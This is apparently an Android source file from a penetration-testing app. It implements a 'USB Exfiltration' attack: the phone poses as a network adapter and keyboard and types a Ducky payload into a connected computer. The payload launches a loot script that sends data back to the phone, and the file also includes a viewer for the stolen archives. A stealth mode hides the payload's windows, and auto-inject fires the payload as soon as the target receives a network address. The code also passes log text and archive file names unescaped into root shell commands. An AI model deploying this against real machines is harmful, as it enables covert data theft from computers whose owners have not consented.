package com.offsec.nethunter;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Typeface;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.LayoutInflater;
import android.widget.AdapterView;
import android.widget.AutoCompleteTextView;
import android.widget.LinearLayout;
import android.widget.Toast;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.Spinner;
import android.widget.Switch;
import android.widget.TextView;
import android.text.Html;
import android.app.AlertDialog;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.material.bottomsheet.BottomSheetDialog;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.offsec.nethunter.RecyclerViewAdapter.LootArchiveAdapter;
import com.offsec.nethunter.models.LootArchive;
import com.offsec.nethunter.utils.NhPaths;
import com.offsec.nethunter.utils.ShellExecuter;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class UsbExfiltrationFragment extends Fragment {

    private final ShellExecuter exe = new ShellExecuter();
    private TextView tvLogs;
    private ScrollView svLogs;
    private Button btnStart, btnStop, btnDucky, btnViewLoot;
    private Spinner spLaunchKeys;
    private Spinner spTargetOS;
    private Switch swStealthMode;
    private Switch swAutoInject;
    private AutoCompleteTextView actvLinuxScript;
    private AutoCompleteTextView actvWindowsScript;
    private LinearLayout llLinuxScriptContainer;
    private LinearLayout llWindowsScriptContainer;
    private String selectedLinuxScript = "loot.sh";
    private String selectedWindowsScript = "loot.ps1";
    private boolean hasAutoInjected = false;
    private String detectedServerIp = "192.168.137.1"; // Store detected RNDIS IP for HID injection
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Handler logHandler = new Handler(Looper.getMainLooper());
    private Runnable logRunnable;
    private static final String LOG_FILE = NhPaths.SD_PATH + "/nh_files/usb_exfil/usb_exfil.log";
    private static final String LOOT_DIR = "/sdcard/usb_exfil_loot";
    private static final String PREF_FILE = "com.offsec.nethunter";
    private static final String PREF_IS_RUNNING = "is_usb_exfil_running";
    private static final String PREF_STEALTH_MODE = "usb_exfil_stealth_mode";
    private static final String PREF_AUTO_INJECT = "usb_exfil_auto_inject";

    private final ActivityResultLauncher<String[]> pickScriptLauncher =
            registerForActivityResult(new ActivityResultContracts.OpenDocument(), uri -> {
                if (uri != null) {
                    String selectedTarget = spTargetOS.getSelectedItem().toString();
                    String targetScript = selectedTarget.equals("Linux") ? "loot.sh" : "loot.ps1";
                    String dstPath = NhPaths.SD_PATH + "/nh_files/usb_exfil/" + targetScript;

                    try {
                        InputStream in = requireContext().getContentResolver().openInputStream(uri);
                        FileOutputStream out = new FileOutputStream(dstPath);
                        byte[] buffer = new byte[8192];
                        int read;
                        while ((read = in.read(buffer)) != -1) {
                            out.write(buffer, 0, read);
                        }
                        in.close();
                        out.close();

                        appendLog("[*] Custom script loaded successfully");
                        if (selectedTarget.equals("Linux")) {
                            selectedLinuxScript = "Custom";
                            actvLinuxScript.setText("Custom", false);
                        } else {
                            selectedWindowsScript = "Custom";
                            actvWindowsScript.setText("Custom", false);
                        }
                    } catch (IOException e) {
                        appendLog("[-] Error loading custom script: " + e.getMessage());
                    }
                }
            });

    public static UsbExfiltrationFragment newInstance() {
        return new UsbExfiltrationFragment();
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        return inflater.inflate(R.layout.usb_exfiltration_fragment, container, false);
    }

    @Override
    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);

        btnStart = view.findViewById(R.id.btn_exfil_start);
        btnStop = view.findViewById(R.id.btn_exfil_stop);
        btnDucky = view.findViewById(R.id.btn_exfil_ducky);
        btnViewLoot = view.findViewById(R.id.btn_view_loot);
        spLaunchKeys = view.findViewById(R.id.sp_launch_keys);
        spTargetOS = view.findViewById(R.id.sp_target_os);
        swStealthMode = view.findViewById(R.id.sw_stealth_mode);
        swAutoInject = view.findViewById(R.id.sw_auto_inject);
        llLinuxScriptContainer = view.findViewById(R.id.ll_linux_script_container);
        llWindowsScriptContainer = view.findViewById(R.id.ll_windows_script_container);
        actvLinuxScript = view.findViewById(R.id.actv_linux_script);
        actvWindowsScript = view.findViewById(R.id.actv_windows_script);
        Button btnCopyLogs = view.findViewById(R.id.btn_copy_logs);
        Button btnClearLogs = view.findViewById(R.id.btn_clear_logs);
        tvLogs = view.findViewById(R.id.tv_logs);
        svLogs = view.findViewById(R.id.sv_logs);

        setHasOptionsMenu(true);

        // Populate Spinner
        String[] options = new String[]{
                "Run Dialog (Alt + F2 / Win + R)",
                "Terminal (Ctrl + Alt + T)",
                "Terminal (Super + T)"
        };
        ArrayAdapter<String> adapter = new ArrayAdapter<>(requireContext(), android.R.layout.simple_spinner_dropdown_item, options);
        spLaunchKeys.setAdapter(adapter);

        // Populate Target Spinner
        String[] targets = new String[]{"Linux", "Windows"};
        ArrayAdapter<String> targetAdapter = new ArrayAdapter<>(requireContext(), android.R.layout.simple_spinner_dropdown_item, targets);
        spTargetOS.setAdapter(targetAdapter);

        // Populate script dropdowns
        populateScriptDropdown(actvLinuxScript, "scripts_linux");
        populateScriptDropdown(actvWindowsScript, "scripts_windows");

        // Show/hide script selection based on target OS
        spTargetOS.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                String target = parent.getItemAtPosition(position).toString();
                if (target.equals("Linux")) {
                    llLinuxScriptContainer.setVisibility(View.VISIBLE);
                    llWindowsScriptContainer.setVisibility(View.GONE);
                } else {
                    llLinuxScriptContainer.setVisibility(View.GONE);
                    llWindowsScriptContainer.setVisibility(View.VISIBLE);
                }
            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {}
        });

        // Handle script selection
        actvLinuxScript.setOnItemClickListener((parent, view1, position, id) -> {
            String selected = parent.getItemAtPosition(position).toString();
            if (selected.equals("Custom...")) {
                pickScriptLauncher.launch(new String[]{"*/*"});
            } else {
                selectedLinuxScript = selected;
            }
        });

        actvWindowsScript.setOnItemClickListener((parent, view1, position, id) -> {
            String selected = parent.getItemAtPosition(position).toString();
            if (selected.equals("Custom...")) {
                pickScriptLauncher.launch(new String[]{"*/*"});
            } else {
                selectedWindowsScript = selected;
            }
        });

        btnStart.setOnClickListener(v -> startExfilAttack());
        btnStop.setOnClickListener(v -> stopExfilAttack());
        btnDucky.setOnClickListener(v -> injectDucky());
        btnViewLoot.setOnClickListener(v -> showLootViewer());
        btnCopyLogs.setOnClickListener(v -> copyLogs());
        btnClearLogs.setOnClickListener(v -> clearLogs());

        // Restore state
        android.content.SharedPreferences prefs = requireActivity().getSharedPreferences(PREF_FILE, android.content.Context.MODE_PRIVATE);
        boolean isRunning = prefs.getBoolean(PREF_IS_RUNNING, false);
        updateButtonStates(isRunning);

        swStealthMode.setChecked(prefs.getBoolean(PREF_STEALTH_MODE, true));
        swAutoInject.setChecked(prefs.getBoolean(PREF_AUTO_INJECT, true));

        swStealthMode.setOnCheckedChangeListener((buttonView, isChecked) ->
                prefs.edit().putBoolean(PREF_STEALTH_MODE, isChecked).apply());

        swAutoInject.setOnCheckedChangeListener((buttonView, isChecked) ->
                prefs.edit().putBoolean(PREF_AUTO_INJECT, isChecked).apply());

        logRunnable = new Runnable() {
            @Override
            public void run() {
                updateLogView();
                logHandler.postDelayed(this, 1000);
            }
        };
    }

    @Override
    public void onCreateOptionsMenu(@NonNull Menu menu, @NonNull MenuInflater inflater) {
        inflater.inflate(R.menu.kex_menu, menu);
        super.onCreateOptionsMenu(menu, inflater);
    }

    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        int id = item.getItemId();
        if (id == R.id.action_info) {
            showInfoDialog();
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    public void onResume() {
        super.onResume();
        startLogMonitor();
    }

    @Override
    public void onPause() {
        super.onPause();
        stopLogMonitor();
    }

    private void startLogMonitor() {
        logHandler.removeCallbacks(logRunnable);
        logHandler.post(logRunnable);
    }

    private void stopLogMonitor() {
        logHandler.removeCallbacks(logRunnable);
    }

    private void updateLogView() {
        new Thread(() -> {
            // Read last 500 lines of log
            String cmd = "tail -n 500 " + LOG_FILE;
            String content = exe.RunAsRootOutput(cmd);
            if (content != null) {
                mainHandler.post(() -> {
                    if (tvLogs != null) {
                        CharSequence formatted = formatLog(content);
                        String currentText = tvLogs.getText().toString();
                        if (!currentText.equals(formatted.toString())) {
                            tvLogs.setText(formatted);
                            scrollToBottom();
                            checkAutoInject(content);
                        }
                    }
                });
            }
        }).start();
    }

    private void checkAutoInject(String logs) {
        if (swAutoInject != null && swAutoInject.isChecked() && !hasAutoInjected) {
            // MUST wait for "Target ip address" - this confirms DHCP lease is fully assigned
            // "DHCPACK" appears too early before the network is ready
            if (logs.contains("Target ip address")) {
                hasAutoInjected = true;
                appendLog("[*] Auto-Injecting Ducky Payload (DHCP Lease Confirmed)...");
                // Small delay to ensure network stack is fully ready
                mainHandler.postDelayed(() -> injectDucky(), 2000);
            }
        }
    }

    private void scrollToBottom() {
        try {
            if (svLogs != null) {
                // Post with delay to ensure layout is complete before scrolling
                svLogs.postDelayed(() -> svLogs.fullScroll(View.FOCUS_DOWN), 100);
            }
        } catch (Exception e) {
            // Ignore layout errors during scrolling
        }
    }

    private void appendLog(String message) {
        // Log to file so it appears in monitor
        new Thread(() -> {
            exe.RunAsRoot("echo '" + message + "' >> " + LOG_FILE);
        }).start();

        mainHandler.post(() -> {
            if (tvLogs != null) {
                tvLogs.append(formatLog("\n" + message));
                scrollToBottom();
            }
        });
    }

    private CharSequence formatLog(String text) {
        if (text == null) return "";
        // Remove ANSI escape codes
        String cleanText = text.replaceAll("\\u001B\\[[0-9;]*[a-zA-Z]", "");

        StringBuilder formattedHtml = new StringBuilder();
        String[] lines = cleanText.split("\n");

        for (String line : lines) {
            if (line.contains("Attack complete")) {
                formattedHtml.append("<font color='#FFD700'><b>").append(line).append("</b></font><br>");
            } else if (line.startsWith("[+]")) {
                formattedHtml.append("<font color='#00FF00'>").append(line).append("</font><br>");
            } else if (line.startsWith("[!]")) {
                formattedHtml.append("<font color='#FFA500'>").append(line).append("</font><br>");
            } else if (line.startsWith("[-]")) {
                formattedHtml.append("<font color='#FFA500'>").append(line).append("</font><br>");
            } else if (line.startsWith("[*]")) {
                formattedHtml.append(line).append("<br>");
            } else {
                formattedHtml.append(line).append("<br>");
            }
        }
        return Html.fromHtml(formattedHtml.toString());
    }

    private void clearLogs() {
        if (tvLogs != null) {
            tvLogs.setText("");
        }
        new Thread(() -> {
            exe.RunAsRoot("echo '' > " + LOG_FILE);
        }).start();
    }

    private void copyLogs() {
        if (tvLogs != null) {
            String logs = tvLogs.getText().toString();
            if (!logs.isEmpty()) {
                ClipboardManager clipboard = (ClipboardManager) requireContext().getSystemService(Context.CLIPBOARD_SERVICE);
                ClipData clip = ClipData.newPlainText("NetHunter Logs", logs);
                clipboard.setPrimaryClip(clip);
                Toast.makeText(requireContext(), "Logs copied to clipboard", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(requireContext(), "No logs to copy", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void updateButtonStates(boolean isRunning) {
        if (btnStart == null || btnStop == null) return;

        if (isRunning) {
            // Running: Start dimmed, Stop normal
            btnStart.setAlpha(0.5f);
            btnStop.setAlpha(1.0f);
        } else {
            // Stopped: Start normal, Stop dimmed
            btnStart.setAlpha(1.0f);
            btnStop.setAlpha(0.5f);
        }
    }

    private void startExfilAttack() {
        updateButtonStates(true);
        requireActivity().getSharedPreferences(PREF_FILE, android.content.Context.MODE_PRIVATE)
                .edit().putBoolean(PREF_IS_RUNNING, true).apply();
        hasAutoInjected = false;
        appendLog("[*] Starting USB Exfilitration Attack...");
        new Thread(() -> {
            String selectedTarget = spTargetOS.getSelectedItem().toString().equals("Linux") ? "lnx" : "win";

            // Check if files exist in SD card (they should be synced by App startup)
            String sdPath = NhPaths.SD_PATH + "/nh_files/usb_exfil/";
            if (!new File(sdPath + "listen.py").exists()) {
                appendLog("[-] Error: listen.py not found in " + sdPath);
                appendLog("[!] Please restart the app to sync files.");
                return;
            }

            // Execute start script FIRST - it enables RNDIS and starts usbtethering
            // The script is in APP_SD_FILES_PATH/usb_exfil/start.sh
            String scriptPath = NhPaths.APP_SD_FILES_PATH + "/usb_exfil/start.sh";
            exe.RunAsRoot("chmod 755 " + scriptPath);
            appendLog("[*] Executing: " + scriptPath);

            String out = exe.RunAsRootOutput("sh " + scriptPath + " " + NhPaths.APP_SCRIPTS_PATH + " " + selectedTarget);
            appendLog("[+] Output: " + out);
            appendLog("[*] RNDIS should be active.");
            appendLog("[*] Python listener should be running in chroot.");

            // Extract gateway IP from usbtethering logs
            // The usbtethering script logs the gateway IP it configured
            String rndisIp = extractGatewayIpFromLogs();
            if (rndisIp == null || rndisIp.isEmpty()) {
                appendLog("[-] Warning: Could not extract gateway IP from logs, using default 192.168.137.1");
                rndisIp = "192.168.137.1";
            } else {
                appendLog("[+] Gateway IP from usbtethering: " + rndisIp);
            }

            // Store for HID injection
            detectedServerIp = rndisIp;

            // Copy selected script to loot.sh or loot.ps1 and inject the IP
            String scriptDir = selectedTarget.equals("lnx") ? "scripts_linux" : "scripts_windows";
            String selectedScript = selectedTarget.equals("lnx") ? selectedLinuxScript : selectedWindowsScript;
            String targetScript = selectedTarget.equals("lnx") ? "loot.sh" : "loot.ps1";

            if (!selectedScript.equals("Custom...") && !selectedScript.equals("Custom")) {
                String srcPath = NhPaths.SD_PATH + "/nh_files/usb_exfil/" + scriptDir + "/" + selectedScript;
                String dstPath = NhPaths.SD_PATH + "/nh_files/usb_exfil/" + targetScript;
                exe.RunAsRoot("cp " + srcPath + " " + dstPath);

                // Inject the detected RNDIS IP into the script
                injectIpIntoScript(dstPath, rndisIp);

                appendLog("[*] Using script: " + selectedScript);
            } else if (selectedScript.equals("Custom")) {
                appendLog("[*] Using custom script");
            }

            appendLog("[*] Monitoring " + LOG_FILE + "...");
        }).start();
    }

    private void stopExfilAttack() {
        updateButtonStates(false);
        requireActivity().getSharedPreferences(PREF_FILE, android.content.Context.MODE_PRIVATE)
                .edit().putBoolean(PREF_IS_RUNNING, false).apply();
        appendLog("[*] Stopping Attack...");
        new Thread(() -> {
             String scriptPath = NhPaths.APP_SD_FILES_PATH + "/usb_exfil/stop.sh";
             exe.RunAsRoot("chmod 755 " + scriptPath);
             exe.RunAsRootOutput("sh " + scriptPath + " " + NhPaths.APP_SCRIPTS_PATH);
             appendLog("[+] Stopped.");
        }).start();
    }

    private void showInfoDialog() {
        new AlertDialog.Builder(requireContext())
                .setTitle(R.string.info)
                .setMessage(R.string.usb_exfil_description)
                .setPositiveButton(android.R.string.ok, null)
                .show();
    }

    private void injectDucky() {
        String selected = spLaunchKeys.getSelectedItem().toString();
        String launchKeys = "ALT F2";
        if (selected.contains("Alt + F2")) launchKeys = "ALT F2";
        else if (selected.contains("Ctrl + Alt + T")) launchKeys = "CTRL ALT t";
        else if (selected.contains("Super + T")) launchKeys = "GUI t";

        final String finalLaunchKeys = launchKeys;

        String selectedTarget = spTargetOS.getSelectedItem().toString();
        String duckyFilename = selectedTarget.equals("Linux") ? "ducky_linux.txt" : "ducky_windows.txt";
        boolean isStealth = swStealthMode.isChecked();

        appendLog("[*] Injecting Ducky Payload for " + selectedTarget + " (Stealth: " + isStealth + ")...");
        new Thread(() -> {
             String duckyScriptPath = NhPaths.SD_PATH + "/nh_files/usb_exfil/" + duckyFilename;
             String tempDuckyPath = NhPaths.SD_PATH + "/nh_files/usb_exfil/ducky_temp.txt";
             String convertedScriptPath = NhPaths.SD_PATH + "/nh_files/usb_exfil/ducky_out.sh";

             // Check if HID interface exists
             if (!new File("/dev/hidg0").exists()) {
                 appendLog("[-] Error: /dev/hidg0 not found. Is HID enabled?");
                 return;
             }

             // Ensure permissions
             exe.RunAsRoot("chmod 666 /dev/hidg0");

             // 0. Prepare Ducky Script (Replace Placeholders)
             StringBuilder content = new StringBuilder();
             try {
                 BufferedReader reader = new BufferedReader(new FileReader(duckyScriptPath));
                 String line;
                 while ((line = reader.readLine()) != null) {
                     String processedLine = line.replace("{{LAUNCH_KEYS}}", finalLaunchKeys)
                             .replace("{{WIN_HIDDEN}}", isStealth ? "-W Hidden" : "")
                             .replace("{{LNX_HIDE}}", isStealth ? " & exit" : "")
                             .replace("{{SERVER_IP}}", detectedServerIp);
                     content.append(processedLine).append("\n");
                 }
                 reader.close();
             } catch (IOException e) {
                 appendLog("[-] Error reading template: " + e.getMessage());
                 return;
             }

             // Caching Check
             boolean cacheValid = false;
             File tempFile = new File(tempDuckyPath);
             File outFile = new File(convertedScriptPath);

             if (tempFile.exists() && outFile.exists() && outFile.length() > 0) {
                 StringBuilder oldContent = new StringBuilder();
                 try (BufferedReader br = new BufferedReader(new FileReader(tempFile))) {
                     String line;
                     while ((line = br.readLine()) != null) {
                         oldContent.append(line).append("\n");
                     }
                 } catch (IOException e) {
                     appendLog("[-] Error reading cache: " + e.getMessage());
                 }

                 if (content.toString().trim().equals(oldContent.toString().trim())) {
                     cacheValid = true;
                 } else {
                     appendLog("[*] Script content changed. Regenerating...");
                 }
             } else {
                 appendLog("[*] Cache missing or invalid.");
             }

             if (cacheValid) {
                 appendLog("[*] Cache hit: Skipping conversion.");
             } else {
                 try {
                     FileWriter writer = new FileWriter(tempDuckyPath);
                     writer.write(content.toString());
                     writer.close();
                     appendLog("[*] Generated payload with trigger: " + finalLaunchKeys);
                 } catch (IOException e) {
                     appendLog("[-] Error writing payload: " + e.getMessage());
                     return;
                 }

                 // 1. Convert Ducky Script to Shell Script (Use temp file)
                 String convertCmd = "sh " + NhPaths.APP_SCRIPTS_PATH + "/duckyconverter -i " + tempDuckyPath +
                                " -o " + convertedScriptPath + " -l us";

                 appendLog("[*] Converting payload...");
                 int convertResult = exe.RunAsRootReturnValue(convertCmd);

                 if (convertResult != 0) {
                     appendLog("[-] Error: Conversion failed.");
                     return;
                 }
                 appendLog("[+] Conversion successful.");
             }

             // 2. Execute the converted script
             appendLog("[*] Executing payload...");
             String runCmd = "sh " + convertedScriptPath;
             String out = exe.RunAsRootOutput(runCmd);
             appendLog("[+] Execution finished.");
             appendLog("[+] Output: " + out);
        }).start();
    }

    private void populateScriptDropdown(AutoCompleteTextView dropdown, String subdirectory) {
        List<String> scripts = new ArrayList<>();

        // Check SD card (user can add custom scripts here)
        File sdScriptDir = new File(NhPaths.SD_PATH + "/nh_files/usb_exfil/" + subdirectory);
        if (sdScriptDir.exists() && sdScriptDir.isDirectory()) {
            File[] files = sdScriptDir.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (!f.isDirectory() && !f.getName().startsWith(".")) {
                        scripts.add(f.getName());
                    }
                }
            }
        }

        // Fallback: if directory doesn't exist yet, show default script
        if (scripts.isEmpty()) {
            String defaultScript = subdirectory.equals("scripts_linux") ? "loot.sh" : "loot.ps1";
            scripts.add(defaultScript);
            appendLog("[!] Script directory not found. App restart required to sync new scripts.");
        }

        // Add "Custom..." option to allow file picker
        scripts.add("Custom...");

        Collections.sort(scripts.subList(0, scripts.size() - 1)); // Sort except last "Custom..."

        ArrayAdapter<String> adapter = new ArrayAdapter<>(
                requireContext(),
                android.R.layout.simple_list_item_1,
                scripts
        );
        dropdown.setAdapter(adapter);

        // Set default selection
        if (!scripts.isEmpty() && !scripts.get(0).equals("Custom...")) {
            dropdown.setText(scripts.get(0), false);
            if (subdirectory.equals("scripts_linux")) {
                selectedLinuxScript = scripts.get(0);
            } else {
                selectedWindowsScript = scripts.get(0);
            }
        }
    }

    private void showLootViewer() {
        List<LootArchive> archives = getLootArchives();

        if (archives.isEmpty()) {
            Toast.makeText(requireContext(), "No loot collected yet", Toast.LENGTH_SHORT).show();
            return;
        }

        View dialogView = getLayoutInflater().inflate(R.layout.usb_loot_viewer_dialog, null);
        RecyclerView recyclerView = dialogView.findViewById(R.id.rv_loot_archives);
        Button btnClose = dialogView.findViewById(R.id.btn_close_loot_viewer);

        final LootArchiveAdapter[] adapterHolder = new LootArchiveAdapter[1];
        adapterHolder[0] = new LootArchiveAdapter(requireContext(), archives,
                new LootArchiveAdapter.LootArchiveListener() {
                    @Override
                    public void onViewArchive(LootArchive archive) {
                        viewArchiveContents(archive);
                    }

                    @Override
                    public void onDeleteArchive(LootArchive archive) {
                        confirmDeleteArchive(archive, archives, adapterHolder[0]);
                    }
                });

        recyclerView.setLayoutManager(new LinearLayoutManager(requireContext()));
        recyclerView.setAdapter(adapterHolder[0]);

        BottomSheetDialog dialog = new BottomSheetDialog(requireContext());
        dialog.setContentView(dialogView);
        btnClose.setOnClickListener(v -> dialog.dismiss());
        dialog.show();
    }

    private List<LootArchive> getLootArchives() {
        List<LootArchive> archives = new ArrayList<>();
        File lootDir = new File(LOOT_DIR);

        if (lootDir.exists() && lootDir.isDirectory()) {
            File[] files = lootDir.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (f.isFile() && (f.getName().startsWith("loot_"))) {
                        archives.add(new LootArchive(f));
                    }
                }
            }
        }

        // Sort by timestamp descending (newest first)
        Collections.sort(archives, (a, b) -> Long.compare(b.getTimestamp(), a.getTimestamp()));
        return archives;
    }

    private void confirmDeleteArchive(LootArchive archive, List<LootArchive> archives, LootArchiveAdapter adapter) {
        new MaterialAlertDialogBuilder(requireContext())
                .setTitle("Delete Archive")
                .setMessage("Are you sure you want to delete " + archive.getFilename() + "?")
                .setPositiveButton("Delete", (dialog, which) -> {
                    if (archive.getFile().delete()) {
                        archives.remove(archive);
                        adapter.notifyDataSetChanged();
                        Toast.makeText(requireContext(), "Archive deleted", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(requireContext(), "Failed to delete archive", Toast.LENGTH_SHORT).show();
                    }
                })
                .setNegativeButton("Cancel", null)
                .show();
    }

    private void viewArchiveContents(LootArchive archive) {
        new Thread(() -> {
            // Extract file list from archive
            String listCmd;
            boolean isZip = false;
            if (archive.getFilename().endsWith(".tar.gz")) {
                listCmd = "tar -tzf " + archive.getFile().getAbsolutePath();
            } else if (archive.getFilename().endsWith(".zip")) {
                listCmd = "unzip -l " + archive.getFile().getAbsolutePath();
                isZip = true;
            } else {
                mainHandler.post(() ->
                        Toast.makeText(requireContext(), "Unsupported archive format", Toast.LENGTH_SHORT).show()
                );
                return;
            }

            String fileList = exe.RunAsRootOutput(listCmd);
            if (fileList == null || fileList.isEmpty()) {
                mainHandler.post(() ->
                        Toast.makeText(requireContext(), "Failed to read archive", Toast.LENGTH_SHORT).show()
                );
                return;
            }

            String[] files;
            if (isZip) {
                // Parse unzip -l output to extract just filenames
                List<String> fileNames = new ArrayList<>();
                String[] lines = fileList.split("\n");
                boolean inFileSection = false;
                for (String line : lines) {
                    if (line.contains("----")) {
                        if (!inFileSection) {
                            inFileSection = true;
                        } else {
                            break; // End of file list
                        }
                        continue;
                    }
                    if (inFileSection && line.trim().length() > 0) {
                        // Line format: "  Length      Date    Time    Name"
                        // We want the last part (filename)
                        String[] parts = line.trim().split("\\s+");
                        if (parts.length >= 4) {
                            String filename = parts[parts.length - 1];
                            fileNames.add(filename);
                        }
                    }
                }
                files = fileNames.toArray(new String[0]);
            } else {
                files = fileList.split("\n");
            }

            final String[] finalFiles = files;
            mainHandler.post(() -> showArchiveFilesDialog(archive, finalFiles));
        }).start();
    }

    private void showArchiveFilesDialog(LootArchive archive, String[] files) {
        View dialogView = getLayoutInflater().inflate(R.layout.usb_archive_contents_dialog, null);
        TextView tvTitle = dialogView.findViewById(R.id.tv_archive_title);
        TextView tvInfo = dialogView.findViewById(R.id.tv_archive_info);
        RecyclerView recyclerView = dialogView.findViewById(R.id.rv_archive_files);
        Button btnClose = dialogView.findViewById(R.id.btn_close_archive_viewer);

        tvTitle.setText("Archive: " + archive.getFilename());
        tvInfo.setText(files.length + " files • " + archive.getFormattedSize());

        // Simple adapter for file list
        RecyclerView.Adapter<FileViewHolder> adapter = new RecyclerView.Adapter<FileViewHolder>() {
            @NonNull
            @Override
            public FileViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
                View view = LayoutInflater.from(requireContext())
                        .inflate(R.layout.usb_archive_file_item, parent, false);
                return new FileViewHolder(view);
            }

            @Override
            public void onBindViewHolder(@NonNull FileViewHolder holder, int position) {
                String filename = files[position];
                holder.tvFileName.setText(filename);
                holder.tvFileSize.setText(filename.endsWith("/") ? "Directory" : "File");

                // Allow viewing text files
                if (!filename.endsWith("/") && isTextFile(filename)) {
                    holder.itemView.setOnClickListener(v -> viewFileContents(archive, filename));
                }
            }

            @Override
            public int getItemCount() {
                return files.length;
            }
        };

        recyclerView.setLayoutManager(new LinearLayoutManager(requireContext()));
        recyclerView.setAdapter(adapter);

        BottomSheetDialog dialog = new BottomSheetDialog(requireContext());
        dialog.setContentView(dialogView);
        btnClose.setOnClickListener(v -> dialog.dismiss());
        dialog.show();
    }

    private boolean isTextFile(String filename) {
        return filename.endsWith(".txt") || filename.endsWith(".log") ||
                filename.endsWith(".conf") || filename.endsWith(".sh") ||
                filename.endsWith(".py") || filename.endsWith(".xml") ||
                filename.endsWith(".json") || filename.endsWith(".ini");
    }

    private void viewFileContents(LootArchive archive, String filename) {
        new Thread(() -> {
            // Extract and read file contents
            String extractCmd;
            String tmpFile = "/sdcard/.tmp_loot_view.txt";

            if (archive.getFilename().endsWith(".tar.gz")) {
                extractCmd = "tar -xzf " + archive.getFile().getAbsolutePath() +
                        " -O " + filename + " > " + tmpFile;
            } else {
                extractCmd = "unzip -p " + archive.getFile().getAbsolutePath() +
                        " " + filename + " > " + tmpFile;
            }

            exe.RunAsRoot(extractCmd);
            String content = exe.RunAsRootOutput("cat " + tmpFile);
            exe.RunAsRoot("rm " + tmpFile);

            mainHandler.post(() -> showFileContentDialog(filename, content));
        }).start();
    }

    private void showFileContentDialog(String filename, String content) {
        ScrollView scrollView = new ScrollView(requireContext());
        TextView textView = new TextView(requireContext());
        textView.setText(content);
        textView.setTextIsSelectable(true);
        textView.setTypeface(Typeface.MONOSPACE);
        textView.setPadding(16, 16, 16, 16);
        scrollView.addView(textView);

        new MaterialAlertDialogBuilder(requireContext())
                .setTitle(filename)
                .setView(scrollView)
                .setPositiveButton("Close", null)
                .show();
    }

    private static class FileViewHolder extends RecyclerView.ViewHolder {
        TextView tvFileName, tvFileSize;

        public FileViewHolder(View view) {
            super(view);
            tvFileName = view.findViewById(R.id.tv_file_name);
            tvFileSize = view.findViewById(R.id.tv_file_size);
        }
    }

    /**
     * Extracts the gateway IP from usbtethering logs.
     * The usbtethering script logs "IP_GW: <ip>" which is the gateway IP we need.
     */
    private String extractGatewayIpFromLogs() {
        try {
            // Read the log file and look for IP_GW line
            String cmd = "grep 'IP_GW:' " + LOG_FILE + " | tail -1 | awk '{print $2}'";
            String result = exe.RunAsRootOutput(cmd);

            if (result != null && !result.trim().isEmpty()) {
                String ip = result.trim();
                // Validate it's a valid IP
                if (ip.matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}")) {
                    return ip;
                }
            }
        } catch (Exception e) {
            // Fall through to return null
        }

        return null;
    }

    /**
     * Injects the detected RNDIS IP into the script by replacing hardcoded IP addresses.
     */
    private void injectIpIntoScript(String scriptPath, String rndisIp) {
        try {
            // Read the script
            File scriptFile = new File(scriptPath);
            if (!scriptFile.exists()) {
                appendLog("[-] Script file not found: " + scriptPath);
                return;
            }

            BufferedReader reader = new BufferedReader(new FileReader(scriptFile));
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            reader.close();

            String scriptContent = content.toString();

            // Replace hardcoded IPs with detected RNDIS IP
            // Handle both Linux shell scripts and PowerShell scripts
            scriptContent = scriptContent.replaceAll("192\\.168\\.137\\.1", rndisIp);
            scriptContent = scriptContent.replaceAll("SERVER_IP=\"[^\"]*\"", "SERVER_IP=\"" + rndisIp + "\"");
            scriptContent = scriptContent.replaceAll("\\$SERVER_IP = \"[^\"]*\"", "\\$SERVER_IP = \"" + rndisIp + "\"");

            // Write back to file
            FileWriter writer = new FileWriter(scriptFile);
            writer.write(scriptContent);
            writer.close();

            appendLog("[+] Injected IP " + rndisIp + " into script");
        } catch (IOException e) {
            appendLog("[-] Error injecting IP into script: " + e.getMessage());
        }
    }
}
